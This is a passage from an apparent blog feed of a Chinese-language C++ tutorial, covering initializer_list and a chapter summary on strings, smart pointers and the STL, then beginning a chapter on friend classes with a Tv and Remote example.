&lt;&lt; &quot;Sum of strings: &quot; &lt;&lt; total_string &lt;&lt; std::endl; // 输出 &quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. 作为构造函数参数:</strong></p><p>这是 <code>initializer_list</code> 最重要的用途之一，它使得 STL 容器（如 <code>vector</code>, <code>list</code>, <code>map</code>, <code>set</code> 等）以及用户自定义的类能够支持简洁的花括号列表初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：一个简单的自定义类，支持 initializer_list 构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyData</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数接受 initializer_list</span></span><br><span class="line">    MyData(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;<span class="keyword">int</span>&gt; il) : data_(il) &#123; <span class="comment">// 可以直接用来初始化 vector 成员</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyData constructed with &quot;</span> &lt;&lt; il.size() &lt;&lt; <span class="string">&quot; elements.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x : data_) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 initializer_list 构造 STL 容器</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;; <span class="comment">// 调用 vector(initializer_list&lt;int&gt;) 构造函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m = &#123;&#123;<span class="string">&quot;one&quot;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&quot;two&quot;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&quot;three&quot;</span>, <span class="number">3</span>&#125;&#125;; <span class="comment">// 调用 map(initializer_list&lt;pair&lt;const string, int&gt;&gt;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 initializer_list 构造自定义类</span></span><br><span class="line">    MyData md1 = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    MyData md2 &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>&#125;; <span class="comment">// 也可以用花括号直接初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;md1 data: &quot;</span>;</span><br><span class="line">    md1.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;md2 data: &quot;</span>;</span><br><span class="line">    md2.print();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>initializer_list</code> 极大地增强了 C++11 及以后版本的初始化语法，使其更加统一和方便，特别是对于容器和需要接受可变数量同类型参数的场景。</p><h2 id="16-8-总结"><a href="#16-8-总结" class="headerlink" title="16.8 总结"></a>16.8 总结</h2><p>本章深入探讨了 C++ 标准库提供的几个强大的工具，它们极大地增强了 C++ 的功能和易用性，特别是 <code>string</code> 类、智能指针和标准模板库 (STL)。</p><p>主要内容回顾：</p><ol><li><p><strong><code>string</code> 类:</strong></p><ul><li>  提供了比 C 风格字符数组更安全、更方便的字符串处理方式，具有自动内存管理和丰富的成员函数（构造、输入、拼接、查找、修改、比较等）。</li><li>  支持通过 <code>c_str()</code> 获取与 C 风格函数兼容的 <code>const char*</code>。</li><li>  标准库还提供了宽字符版本如 <code>wstring</code>。</li></ul></li><li><p><strong>智能指针 (<code>&lt;memory&gt;</code>):</strong></p><ul><li>  用于自动管理动态分配的内存，防止内存泄漏和悬挂指针。</li><li>  <strong><code>unique_ptr</code>:</strong> 实现独占所有权，轻量级，不可复制，可移动。管理动态数组时使用 <code>unique_ptr&lt;T[]&gt;</code>。是管理动态资源的首选。</li><li>  <strong><code>shared_ptr</code>:</strong> 实现共享所有权，通过引用计数管理资源生命周期。当最后一个 <code>shared_ptr</code> 销毁时释放资源。需要注意循环引用问题。</li><li>  <strong><code>weak_ptr</code>:</strong> 非拥有型指针，用于观察 <code>shared_ptr</code> 管理的对象，不增加引用计数，可用于打破循环引用。通过 <code>lock()</code> 安全地获取 <code>shared_ptr</code>。</li><li>  应优先使用 <code>make_unique</code> 和 <code>make_shared</code> 创建智能指针。</li><li>  <code>auto_ptr</code> 已被废弃，应使用 <code>unique_ptr</code>。</li></ul></li><li><p><strong>标准模板库 (STL):</strong></p><ul><li>  基于泛型编程思想，提供通用的容器、算法和迭代器。</li><li><strong>容器:</strong> 存储数据的模板类。<ul><li>  <strong>顺序容器:</strong> <code>vector</code> (动态数组), <code>deque</code> (双端队列), <code>list</code> (双向链表), <code>forward_list</code> (单向链表), <code>array</code> (固定大小数组)。</li><li>  <strong>关联容器:</strong> <code>set</code>, <code>map</code>, <code>multiset</code>, <code>multimap</code> (基于键排序，对数时间复杂度)。</li><li>  <strong>无序关联容器:</strong> <code>unordered_set</code>, <code>unordered_map</code>, <code>unordered_multiset</code>, <code>unordered_multimap</code> (基于哈希，平均常数时间复杂度)。</li><li>  <strong>容器适配器:</strong> <code>stack</code>, <code>queue</code>, <code>priority_queue</code> (提供特定接口)。</li></ul></li><li>  <strong><code>vector</code>:</strong> 最常用的动态数组，支持随机访问，尾部操作高效。</li><li>  <strong>迭代器:</strong> 泛化的指针，连接容器和算法，提供统一的遍历接口。分为输入、输出、前向、双向、随机访问五种类别。</li><li>  <strong>算法 (<code>&lt;algorithm&gt;</code>, <code>&lt;numeric&gt;</code>):</strong> 对迭代器指定的范围进行操作的函数模板（如 <code>sort</code>, <code>find</code>, <code>copy</code>, <code>transform</code>, <code>accumulate</code>）。算法通常不改变容器大小，需要配合容器方法（如 <code>erase</code>）来实际增删元素。</li><li>  <strong>基于范围的 for 循环 (C++11):</strong> 提供了简洁、安全的遍历容器（或序列）的方式。</li></ul></li><li><p><strong>函数对象 (Functors):</strong></p><ul><li>  重载了 <code>operator()</code> 的类的对象，可以像函数一样调用。</li><li>  可以携带状态，常作为参数传递给 STL 算法以定制行为。</li><li>  标准库在 <code>&lt;functional&gt;</code> 中提供了预定义的函数符（如 <code>plus</code>, <code>less</code>）。</li><li>  现代 C++ 中，Lambda 表达式和 <code>std::bind</code> 提供了比旧式函数适配器更灵活的方式。</li></ul></li><li><p><strong>其他库特性:</strong></p><ul><li>  <strong><code>valarray</code> (<code>&lt;valarray&gt;</code>):</strong> 专为数值计算设计的动态数组，支持元素级算术运算。</li><li>  <strong><code>initializer_list</code> (<code>&lt;initializer_list&gt;</code>, C++11):</strong> 使得函数和构造函数能接受花括号初始化列表 <code>&#123;...&#125;</code>，简化了容器和自定义类的初始化。</li></ul></li></ol><p>本章介绍的库特性是现代 C++ 编程的基础。熟练运用 <code>string</code>、智能指针和 STL 的容器、迭代器、算法，可以编写出更安全、更简洁、更高效、更易于维护的代码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 15 友元、异常和其他</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_15/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_15/</url>
      
        <content type="html"><![CDATA[<h2 id="15-1-友元"><a href="#15-1-友元" class="headerlink" title="15.1 友元"></a>15.1 友元</h2><p>通常，类的 <code>private</code> 和 <code>protected</code> 成员只能被该类的成员函数访问。这是 C++ 封装性的体现，有助于保护数据和隐藏实现细节。然而，在某些特殊情况下，允许特定的外部函数或类访问一个类的私有或保护成员会非常方便。C++ 提供了<strong>友元 (friend)</strong> 机制来实现这种受控的访问。</p><p><strong>友元</strong>可以是：</p><ul><li>  <strong>友元函数 (Friend Function):</strong> 一个非成员函数被声明为某个类的友元。</li><li>  <strong>友元类 (Friend Class):</strong> 一个类被声明为另一个类的友元。</li><li>  <strong>友元成员函数 (Friend Member Function):</strong> 某个类的成员函数被声明为另一个类的友元。</li></ul><p><strong>声明友元:</strong></p><p>在需要授予访问权限的类（我们称之为<strong>宿主类</strong>）的定义内部，使用 <code>friend</code> 关键字来声明友元。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostClass</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> ReturnType <span class="title">friendFunctionName</span><span class="params">(parameters)</span></span>; <span class="comment">// 声明友元函数</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">FriendClassName</span>;</span>                    <span class="comment">// 声明友元类</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> ReturnType <span class="title">AnotherClass::memberFuncName</span><span class="params">(parameters)</span></span>; <span class="comment">// 声明友元成员函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> privateData;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> protectedData;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>重要特性:</strong></p><ul><li>  <strong>访问权限:</strong> 友元函数或友元类（及其所有成员函数）可以访问宿主类的<strong>所有</strong>成员，包括 <code>private</code> 和 <code>protected</code> 成员。</li><li>  <strong>非传递性:</strong> 友元关系不是传递的。如果类 A 是类 B 的友元，类 B 是类 C 的友元，这并不意味着类 A 是类 C 的友元。</li><li>  <strong>非对称性:</strong> 友元关系不是对称的。如果类 A 是类 B 的友元，这并不意味着类 B 是类 A 的友元。</li><li>  <strong>声明位置:</strong> <code>friend</code> 声明可以放在类定义的 <code>public</code>, <code>protected</code>, 或 <code>private</code> 部分，效果是相同的。通常习惯放在类定义的开始或结束处。</li></ul><h3 id="15-1-1-友元类"><a href="#15-1-1-友元类" class="headerlink" title="15.1.1 友元类"></a>15.1.1 友元类</h3><p>当一个类被声明为另一个类的友元时，这个友元类的<strong>所有成员函数</strong>都可以访问宿主类的私有和保护成员。</p><p><strong>示例:</strong> 假设有一个 <code>Tv</code> 类（电视）和一个 <code>Remote</code> 类（遥控器）。遥控器需要能够直接调整电视的状态（如频道、音量），即使这些状态是私有的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tv.h -- Tv and Remote classes</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TV_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TV_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span>;</span> <span class="comment">// 前向声明 Tv 类，因为 Remote 会用到它</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Remote</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">State</span> &#123;</span> Off, On &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MinVal, MaxVal = <span class="number">20</span> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Antenna, Cable &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> TV, DVD &#125;; <span class="comment">// 假设遥控器也可以控制 DVD</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> mode; <span class="comment">// 控制 TV 还是 DVD</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Remote(<span class="keyword">int</span> m = TV) : mode(m) &#123;&#125;</span><br><span class="line">    <span class="comment">// 遥控器的方法，需要访问 Tv 的私有成员</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">volup</span><span class="params">(Tv &amp; t)</span></span>; <span class="comment">// 引用 Tv 对象</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">voldown</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onoff</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chanup</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chandown</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_mode</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_input</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> state;      <span class="comment">// On or Off</span></span><br><span class="line">    <span class="keyword">int</span> volume;     <span class="comment">// assumed to be digitized</span></span><br><span class="line">    <span class="keyword">int</span> maxchannel; <span class="comment">// maximum number of channels</span></span><br><span class="line">    <span class="keyword">int</span> channel;    <span class="comment">// current channel setting</span></span><br><span class="line">    <span class="keyword">int</span> mode;       <span class="comment">// Antenna or Cable</span></span><br><span class="line">    <span class="keyword">int</span> input;      <span class="comment">// TV or DVD</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 将 Remote 类声明为 Tv 类的友元</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Remote</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">State</span> &#123;</span> Off, On &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MinVal, MaxVal = <span class="number">20</span> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Antenna, Cable &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> TV, DVD &#125;;</span><br><span class="line"></span><br><span class="line">    Tv(<span class="keyword">int</span> s = Off, <span class="keyword">int</span> mc = <span class="number">125</span>) : state(s), volume(<span class="number">5</span>),</span><br><span class="line">        maxchannel(mc), channel(<span class="number">2</span>), mode(Cable), input(TV) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onoff</span><span class="params">()</span> </span>&#123; state = (state == On) ? Off : On; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">ison</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> state == On; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">volup</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">voldown</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chanup</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chandown</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_mode</span><span class="params">()</span> </span>&#123; mode = (mode == Antenna) ? Cable : Antenna; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_input</span><span class="params">()</span> </span>&#123; input = (input == TV) ? DVD : TV; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">settings</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// display all settings</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remote 方法的实现 (需要看到 Tv 的完整定义)</span></span><br><span class="line"><span class="comment">// 通常放在 .cpp 文件中，或者在 Tv 定义之后</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Remote::volup</span><span class="params">(Tv &amp; t)</span> </span>&#123; <span class="keyword">return</span> t.volup(); &#125; <span class="comment">// 调用 Tv 的公有方法</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Remote::voldown</span><span class="params">(Tv &amp; t)</span> </span>&#123; <span class="keyword">return</span> t.voldown(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::onoff</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.onoff(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::chanup</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.chanup(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::chandown</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.chandown(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_mode</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.set_mode(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_input</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.set_input(); &#125;</span><br><span class="line"><span class="comment">// set_chan 需要直接访问 Tv 的私有成员 channel</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 因为 Remote 是 Tv 的友元，可以直接访问 t.channel</span></span><br><span class="line">    t.channel = c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tv 方法的实现 (部分)</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Tv::volup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &lt; MaxVal) &#123;</span><br><span class="line">        volume++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Tv::voldown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &gt; MinVal) &#123;</span><br><span class="line">        volume--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Tv::chanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (channel &lt; maxchannel) channel++;</span><br><span class="line">    <span class="keyword">else</span> channel = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Tv::chandown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (channel &gt; <span class="number">1</span>) channel--;</span><br><span class="line">    <span class="keyword">else</span> channel = maxchannel;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... settings() 实现需要 iostream ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TV_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use_tv.cpp -- 使用 Tv 和 Remote</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tv::settings() 实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tv::settings</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;TV is &quot;</span> &lt;&lt; (state == On ? <span class="string">&quot;On&quot;</span> : <span class="string">&quot;Off&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (state == On) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Volume setting = &quot;</span> &lt;&lt; volume &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Channel setting = &quot;</span> &lt;&lt; channel &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mode = &quot;</span> &lt;&lt; (mode == Antenna ? <span class="string">&quot;antenna&quot;</span> : <span class="string">&quot;cable&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input = &quot;</span> &lt;&lt; (input == TV ? <span class="string">&quot;TV&quot;</span> : <span class="string">&quot;DVD&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    Tv s42;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial settings for 42\&quot; TV:\n&quot;</span>;</span><br><span class="line">    s42.settings();</span><br><span class="line">    s42.onoff(); <span class="comment">// 打开电视</span></span><br><span class="line">    s42.chanup(); <span class="comment">// 增加频道</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAdjusted settings for 42\&quot; TV:\n&quot;</span>;</span><br><span class="line">    s42.settings();</span><br><span class="line"></span><br><span class="line">    Remote grey; <span class="comment">// 创建遥控器</span></span><br><span class="line">    grey.set_chan(s42, <span class="number">10</span>); <span class="comment">// 遥控器设置频道 (调用友元可访问的私有成员)</span></span><br><span class="line">    grey.volup(s42);      <span class="comment">// 遥控器增加音量</span></span><br><span class="line">    grey.volup(s42);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSettings after using remote:\n&quot;</span>;</span><br><span class="line">    s42.settings();</span><br><span class="line"></span><br><span class="line">    <span class="function">Tv <span class="title">s58</span><span class="params">(Tv::On)</span></span>; <span class="comment">// 创建一个已打开的电视</span></span><br><span class="line">    s58.set_mode(); <span class="comment">// 切换模式</span></span><br><span class="line">    grey.set_chan(s58, <span class="number">28</span>); <span class="comment">// 遥控器控制另一台电视</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSettings for 58\&quot; TV:\n&quot;</span>;</span><br><span class="line">    s58.settings();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Remote</code> 类被声明为 <code>Tv</code> 的友元，因此 <code>Remote</code> 的成员函数（如 <code>set_chan</code>）可以直接访问 